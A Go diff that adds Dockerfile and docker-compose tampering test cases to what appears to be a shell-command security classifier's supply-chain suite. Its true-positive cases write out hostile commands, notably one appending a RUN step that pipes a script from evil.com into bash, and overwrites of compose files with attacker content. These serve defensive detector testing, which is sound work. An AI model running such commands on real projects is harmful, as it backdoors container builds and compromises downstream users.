@@ -979,6 +979,86 @@ var MavenNuGetRegistryCases = []TestCase{
 	},
 }
 
+// DockerfileTamperingCases covers shell writes to Dockerfile and docker-compose.yml (issue #171).
+var DockerfileTamperingCases = []TestCase{
+
+	// --- TRUE POSITIVES ---
+
+	{
+		ID:               "TP-SC-DOCKERFILE-001",
+		Command:          `echo "RUN curl http://evil.com/backdoor.sh | bash" >> Dockerfile`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "Appending a malicious RUN step to Dockerfile — backdoors every container built from this image. MITRE T1612.",
+		Tags:             []string{"tp", "dockerfile", "supply-chain"},
+	},
+	{
+		ID:               "TP-SC-DOCKERFILE-002",
+		Command:          `tee Dockerfile.prod`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "tee with Dockerfile as positional arg — tee copies stdin to the file, overwriting or creating it. MITRE T1612.",
+		Tags:             []string{"tp", "dockerfile", "supply-chain"},
+	},
+	{
+		ID:               "TP-SC-DOCKERFILE-003",
+		Command:          `cat /tmp/evil > docker-compose.yml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "Overwriting docker-compose.yml with attacker-controlled content. Can mount host paths or add malicious services. MITRE T1612.",
+		Tags:             []string{"tp", "docker-compose", "supply-chain"},
+	},
+	{
+		ID:               "TP-SC-DOCKERFILE-004",
+		Command:          `echo "version: '3'" > docker-compose.override.yml`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "Writing a docker-compose override file — can silently add volumes, env vars, or restart policies. MITRE T1612.",
+		Tags:             []string{"tp", "docker-compose", "supply-chain"},
+	},
+
+	// --- TRUE NEGATIVES ---
+
+	{
+		ID:               "TN-SC-DOCKERFILE-001",
+		Command:          `docker build -t myapp:latest .`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "docker build reads Dockerfile — does not write to it. Should AUDIT (default), not BLOCK.",
+		Tags:             []string{"tn", "dockerfile", "safe"},
+	},
+	{
+		ID:               "TN-SC-DOCKERFILE-002",
+		Command:          `cat Dockerfile`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "Reading a Dockerfile is a safe inspection operation — no write involved.",
+		Tags:             []string{"tn", "dockerfile", "safe"},
+	},
+	{
+		ID:               "TN-SC-DOCKERFILE-003",
+		Command:          `docker compose up -d`,
+		ExpectedDecision: "AUDIT",
+		Classification:   "TN",
+		TaxonomyRef:      "supply-chain/build-pipeline/cicd-config-injection",
+		Analyzer:         "regex",
+		Description:      "docker compose up reads docker-compose.yml — no write. Should AUDIT (default), not BLOCK.",
+		Tags:             []string{"tn", "docker-compose", "safe"},
+	},
+}
+
 // AllSupplyChainCases returns all test cases for Kingdom 7.
 func AllSupplyChainCases() []TestCase {
 	var all []TestCase
@@ -991,5 +1071,6 @@ func AllSupplyChainCases() []TestCase {
 	all = append(all, CondaChannelCases...)
 	all = append(all, LockfileOverwriteCases...)
 	all = append(all, MavenNuGetRegistryCases...)
+	all = append(all, DockerfileTamperingCases...)
 	return all
 }
